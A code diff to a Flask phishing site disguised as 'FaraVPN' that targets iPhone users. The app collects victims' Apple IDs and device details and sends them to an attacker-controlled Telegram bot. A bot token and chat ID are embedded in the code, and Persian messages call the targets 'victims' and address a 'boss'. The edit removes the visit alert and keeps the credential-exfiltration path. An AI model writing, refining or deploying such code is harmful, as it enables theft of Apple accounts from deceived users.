@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template_string, url_for
+from flask import Flask, request, render_template_string, url_for, session
 import requests
 import json
 import threading
@@ -6,6 +6,7 @@ import random
 import time
 
 app = Flask(__name__)
+app.secret_key = 'YOUR_SUPER_SECRET_KEY_HERE' # این خط را با یک رشته تصادفی و پیچیده جایگزین کنید
 
 TELEGRAM_BOT_TOKEN = "8144273028:AAGRluY75gCirELIzkCTHvP5EJwO_JLMRtQ"
 TELEGRAM_CHAT_ID = "8147028352"
@@ -25,9 +26,7 @@ def send_to_telegram(data, message_type="data"):
     
     device_info = f"{platform_info}, iOS {ios_version}"
     message = ""
-    if message_type == "visit":
-        message = f"رئیس! قربانی ({device_info}) وارد FaraVPN شد! 😎"
-    elif message_type == "data":
+    if message_type == "data": # فقط پیام‌های "data" ارسال می‌شوند
         message = f"اطلاعات قربانی ({device_info}) از FaraVPN با موفقیت دریافت شد! 🎉\n\n"
         if "apple_id" in data:
             message += f"اپل آیدی: {data['apple_id']}\n"
@@ -54,6 +53,8 @@ def send_to_telegram(data, message_type="data"):
         if "ios_version" in data:
             message += f"نسخه iOS: {data['ios_version']}\n"
         message += f"زمان: {data['timestamp']}"
+    else: # اگر message_type "data" نباشد، هیچ پیامی ارسال نمی‌شود
+        return
 
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
@@ -65,24 +66,8 @@ def send_to_telegram(data, message_type="data"):
 
 @app.route("/")
 def index():
-    user_agent = request.headers.get('User-Agent', 'Unknown')
-    ios_match = user_agent.lower().split('os ')
-    ios_version = "Unknown"
-    if len(ios_match) > 1:
-        version_part = ios_match[1].split(' ')[0].replace('_', '.')
-        if 'like mac os x' in version_part.lower():
-            ios_version = version_part.split('like')[0].strip()
-        else:
-            ios_version = version_part.split(';')[0].strip()
-
-    platform_info = "iPhone" if "iPhone" in user_agent else ("iPad" if "iPad" in user_agent else "Unknown Device")
-
-    device_info = {
-        "platform": platform_info,
-        "ios_version": ios_version,
-        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
-    }
-    threading.Thread(target=send_to_telegram, args=(device_info, "visit")).start()
+    # کد مربوط به ارسال پیام "visit" به طور کامل حذف شد.
+    # نیازی به session['visited_flag'] هم نیست چون پیام visit حذف شده.
 
     return render_template_string('''
     <!DOCTYPE html>
